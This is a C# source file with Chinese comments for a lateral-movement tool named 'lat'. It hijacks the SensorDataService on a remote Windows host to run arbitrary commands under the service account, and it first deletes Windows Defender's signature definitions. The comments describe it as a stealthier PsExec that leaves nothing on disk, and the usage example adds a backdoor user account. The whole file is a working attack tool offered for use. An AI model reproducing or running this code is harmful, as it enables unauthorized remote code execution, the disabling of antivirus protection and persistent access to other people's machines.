using System;
using System.Runtime.InteropServices;

// 說明 
// 與 PsExec 功能相似，PsExec 將執行結果謝入硬碟上，取得執行結果
// 此程式不會將執行結果回傳，因此不會寫入任何資訊到硬碟上
// 加入清除 defender rules

namespace lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[!] Usage: .\\lat.exe target payload");
                Console.WriteLine("[!] Example: .\\lat.exe file02 \"net user ankylo Ankylo33_$! /add /y\"");
                return;
            }

            // 目標主機
            String target = args[0];
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            // SensorService 為 Windows 10 與 Windows 2016/2019 預設有的服務，且預設開機不會啟用
            // string ServiceName = "SensorService";  // reverse shell fail
            string ServiceName = "SensorDataService"; // SensorDataService 比較穩定
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, signature, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);

            // 指定服務執行的 binary
            string payload = "C:\\Windows\\System32\\cmd.exe /c " + args[1];
            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            // 啟用服務
            bResult = StartService(schService, 0, null);
        }
    }
}